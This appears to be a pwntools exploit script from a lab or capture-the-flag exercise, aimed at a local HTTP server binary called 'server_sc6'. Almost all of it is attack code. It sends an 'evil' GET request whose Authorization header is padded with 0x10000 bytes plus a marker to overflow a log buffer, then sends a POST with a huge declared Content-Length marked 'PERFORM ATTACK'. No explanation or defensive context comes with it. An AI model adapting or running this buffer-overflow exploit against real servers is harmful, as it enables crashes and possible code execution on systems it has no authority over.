from pwn import *
import urllib.parse

TARGET = "127.0.0.1"
TARGET_PORT = 8080

elf = context.binary = ELF("./server_sc6")
context.encoding = "latin-1"

log_buffer_rbp_offset = 0x450
formaat = b"== Request from " + b"A" * 15 + b" at fd " + b"A" * 10 + b"\n"

def make_get_request(file):
    return f"GET /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 0\r\n\r\n".encode()

def make_evil_get_request(file):
    return f"GET /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 1337\r\nAuthorization: Basic%s\r\n\r\n".encode()

def make_post_request(file, content_length, data=None):
    return f"POST /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: {content_length}\r\nAuthorization: Basic\r\n\r\n{data}".encode()

def make_new_connection(io=None):
    if io is not None:
        io.close()
    return remote(TARGET, TARGET_PORT)

if __name__.__eq__("__main__"):
    io = make_new_connection()
    evil_get = make_evil_get_request("data.txt")
    length = log_buffer_rbp_offset - (len(formaat) + (len(evil_get) - 2))
    evil_get = evil_get.replace(b"%s", b"A" * 0x10000 + b"BBBBBBBB")

    print(evil_get)

    io.send(evil_get)

    payload = b"A" * 0x200 + b"\x00" + b"A" * 0x1ff
    sc6_exploit = make_post_request("data.txt", 0x500100, payload.decode('utf-8'))

    ### PERFORM ATTACK ###
    io.send(sc6_exploit)
    d = io.recvall(timeout=5)
    print(d)
    io.close()
